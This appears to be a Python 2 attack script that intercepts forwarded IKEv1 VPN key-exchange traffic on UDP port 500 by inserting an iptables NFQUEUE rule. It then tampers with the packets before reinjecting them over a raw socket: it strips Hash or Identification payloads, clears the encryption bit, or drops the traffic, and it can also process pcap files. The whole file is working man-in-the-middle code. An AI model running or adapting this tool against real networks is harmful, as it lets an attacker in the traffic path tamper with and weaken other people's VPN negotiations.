#!/usr/bin/python

import nfqueue, sys, signal, dpkt

from os import system
from optparse import OptionParser
from nfqueue import NF_DROP, NFQNL_COPY_PACKET
from socket import socket, AF_INET, inet_ntoa, SOCK_RAW, IPPROTO_RAW
from dpkt import ethernet, ip, udp
from dpkt.ip import IP_PROTO_UDP

import ike_mangler, ike

IPT_BIN    = '/sbin/iptables'
IPT_STATEs = ( '-D FORWARD -p udp -m udp --dport 500 -j NFQUEUE --queue-num 0', '-I FORWARD -p udp -m udp --dport 500 -j NFQUEUE --queue-num 0' )

# globals
hook_state = 1
loop_state = 1
options    = {}

class NFQueueReader:
    """ Reads data from an NFQueue queue and passes it to the supplied callback """
    def __init__(self, queue, callback):
    	self.queue = nfqueue.queue()
    	self.queue.set_callback(callback)
    	self.queue.fast_open(queue, AF_INET)
    	self.queue.set_queue_maxlen(1024)
    	self.queue.set_mode(NFQNL_COPY_PACKET)

def toggle_hook():
    """ toggle nfqueue hook in iptables """
    global hook_state
    code = system("%s %s" % (IPT_BIN, IPT_STATEs[hook_state]))

    if code == 0:
    	hook_state = (hook_state + 1) % 2

    return code

def callback(payload=None, packet=None):
    """ process traffic from nfqueue or a pcap file (payload != None) """
    # live traffic via nfqueue
    if payload is not None:
    	data   = payload.get_data()
    	packet = ip.IP(data)

    segment  = packet.data
    # IKEv1 parsing is needed to determine the next_payload value
    ike_data = ike.IKE(segment.data)

    if inet_ntoa(packet.src) in options.dest_host:
        # stack mangle options
        if options.remove_hash and ike_data.next_payload == "Hash":
            print "removing Hash payload"
    	    segment.data = ike_mangler.rem_hash(segment.data)
        if options.remove_id and ike_data.next_payload == "Identification":
            print "removing ID payload"
    	    segment.data = ike_mangler.rem_id(segment.data)
        if ike_data.next_payload in options.remove_encryption:
            print "setting encryption bit to 0, IKEv1 next payload %s" % ike_data.next_payload
    	    segment.data = ike_mangler.no_encryption(segment.data)

    	packet.data  = segment

    	# reset checksums and lengths
    	packet.sum  = 0
    	segment.sum = 0
    	segment.ulen = len(segment)
    	packet.len  = len(packet)

    # send on a raw socket
    if not options.drop:
        s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
        s.sendto(str(packet), (inet_ntoa(packet.dst), 0))
        s.close()
    else:
        print "dropping IKEv1 traffic"

    # for live traffic we need to drop the orig packet
    if payload is not None:
    	payload.set_verdict(NF_DROP)

def from_file(path):
    """ process data from a pcap file """
    try:
    	f = open(path)
    except IOError:
    	print 'cannot open', path
    	return 1

    pcap = dpkt.pcap.Reader(f)
    for ts, buf in pcap:
    	eth     = ethernet.Ethernet(buf)
    	packet  = eth.data

    	if packet.p == IP_PROTO_UDP and packet.data.dport == 500:
	    callback(None, packet)

    f.close()

    return 0

def sigint_handler(signal, frame):
    """ SIGINT """
    global loop_state
    loop_state = 0

    toggle_hook()

parser = OptionParser()
parser.add_option("-f", "--file", dest="filename",
                  help="process a pcap file rather than live traffic")
parser.add_option("-d", "--dst", dest="dest_host",
                  help="the destination host (multiple hosts can be specified w/ ',' deliminator) for which packets should be manipulated")
parser.add_option("-i", "--remove-id",
                  action="store_true", dest="remove_id",
                  help="remove the ID payload from IKEv1 main mode packets")
parser.add_option("-q", "--remove-hash",
                  action="store_true", dest="remove_hash",
                  help="remove the HASH payload from IKEv1 quick mode packets")
parser.add_option("-e", "--not-encrypted", dest="remove_encryption",
                  help="set the encryption bit to 0 for IKEv1 packets of the type specified (comma separated list). Valid types are Hash and Identification")
parser.add_option("-n", "--drop",
                  action="store_true", dest="drop",
                  help="drop IKEv1 packets")

def main(argv=None):
    global options
    (options, args) = parser.parse_args()

    if not options.dest_host:
        parser.print_help()
        return 1
    options.dest_host = options.dest_host.split(',')

    if options.remove_encryption:
        options.remove_encryption = options.remove_encryption.split(',')

    # pcap file
    if options.filename:
    	return from_file(options.filename)

    # live capture
    signal.signal(signal.SIGINT, sigint_handler)
    reader = NFQueueReader(0, callback)
    toggle_hook()
    while loop_state:
    	reader.queue.process_pending(5)

    return 0

if __name__ == "__main__":
    sys.exit(main())
